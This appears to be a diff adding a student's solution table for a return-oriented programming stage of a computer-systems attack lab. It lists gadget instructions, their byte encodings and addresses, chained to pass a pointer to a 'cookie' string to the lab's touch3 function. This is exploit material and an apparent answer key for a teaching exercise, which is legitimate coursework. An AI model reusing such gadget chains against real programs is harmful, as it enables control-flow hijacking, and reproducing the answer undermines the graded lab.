@@ -1,0 +1,12 @@
+Instruction			Machine Code	Address
+movq	%rsp,%rax 		48 89 e0	0x401a06
+movq	%rax,%rdi		48 89 c7	0x4019a2
+popq	%rax			58		0x4019ab
+constant 0x48			48		
+movl 	%eax,%edx		89 c2		0x4019dd
+movl	%edx,%ecx		89 d1		0x401a69
+movl	%ecx,%esi		89 ce		0x401a13
+leaq	(%rdi,%rsi,1),%rax	48 8d 04 37	0x4019d6
+movq	%rax,%rdi		48 89 c7	0x4019a2
+touch3						0x4018fa
+cookie						
